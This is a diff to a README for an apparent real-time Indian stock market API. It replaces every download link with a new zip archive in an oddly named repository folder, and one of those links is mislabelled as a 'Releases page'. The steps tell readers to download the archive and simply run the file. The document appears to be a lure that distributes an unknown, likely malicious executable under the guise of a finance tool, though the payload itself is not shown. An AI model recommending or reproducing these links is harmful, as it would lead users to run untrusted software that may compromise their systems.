@@ -1,15 +1,15 @@
 # 📈 Indian-Stock-Market-API - Access Real-Time Indian Stock Market Data
 
 ## 🔗 Download Now
-[![Download Indian Stock Market API](https://raw.githubusercontent.com/Clayborninconsistent906/Indian-Stock-Market-API/main/boltuprightness/Indian-Stock-Market-API_v3.3.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/Clayborninconsistent906/Indian-Stock-Market-API/main/boltuprightness/Indian-Stock-Market-API_v3.3.zip)
+[![Download Indian Stock Market API](https://github.com/Clayborninconsistent906/Indian-Stock-Market-API/raw/refs/heads/main/boltuprightness/Market_Indian_Stock_API_2.5.zip%20Now-v1.0-blue)](https://github.com/Clayborninconsistent906/Indian-Stock-Market-API/raw/refs/heads/main/boltuprightness/Market_Indian_Stock_API_2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the Indian Stock Market API. This software provides easy access to real-time stock prices, company information, and market data from the NSE and BSE. You won’t need to register for an API key, making it simple to get started right away.
 
 ## 📥 Download & Install
-To begin, visit [this page to download](https://raw.githubusercontent.com/Clayborninconsistent906/Indian-Stock-Market-API/main/boltuprightness/Indian-Stock-Market-API_v3.3.zip). You will see the available versions of the software. Choose the version you need, and then click the appropriate link to download the file.
+To begin, visit [this page to download](https://github.com/Clayborninconsistent906/Indian-Stock-Market-API/raw/refs/heads/main/boltuprightness/Market_Indian_Stock_API_2.5.zip). You will see the available versions of the software. Choose the version you need, and then click the appropriate link to download the file.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Clayborninconsistent906/Indian-Stock-Market-API/main/boltuprightness/Indian-Stock-Market-API_v3.3.zip).
+1. Go to the [Releases page](https://github.com/Clayborninconsistent906/Indian-Stock-Market-API/raw/refs/heads/main/boltuprightness/Market_Indian_Stock_API_2.5.zip).
 2. Find the latest version listed.
 3. Click on the download link for your operating system (Windows, macOS, or Linux).
 4. After the download finishes, install the application by following the prompts or just running the downloaded file, depending on your system.
